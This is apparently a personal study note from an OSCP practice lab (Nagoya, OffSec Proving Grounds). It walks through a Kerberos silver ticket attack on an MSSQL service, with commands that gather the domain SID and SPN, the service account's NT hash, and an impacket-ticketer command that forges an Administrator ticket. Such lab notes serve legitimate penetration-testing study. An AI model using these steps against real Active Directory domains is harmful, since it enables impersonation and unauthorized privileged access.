#silverticket

post: https://medium.com/@desp0/tj-nulls-oscp-pick-nagoya-lab-walkthrough-offsec-proving-grounds-guide-b15412c92987

But we can do a silver ticket attack to impersonate administrator and access the SQL server without talking to the KDC. We basically trick SQL into making it think we are someone with high privileges

On the victim’s box we can get the SID of the domain

Getting SID of the domain
# 

Get-ADDomain

![[Pasted image 20250711212311.png]]

S-1-5-21-1969309164-1513403977-1686805993

Getting THE SPN of the user
# 

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName

![[Pasted image 20250711212638.png]]

MSSQL/nagoya.nagoya-industries.com

Convert the Password to NT hash
#

then we need to convert the password to a NT hash, using this website for example: https://codebeautify.org/ntlm-hash-generator

![[Pasted image 20250711212424.png]]

E3A0168BC21CFB88B95C954A5B18F57C

Forge The silver ticket
# 

impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator

![[Pasted image 20250711212823.png]]
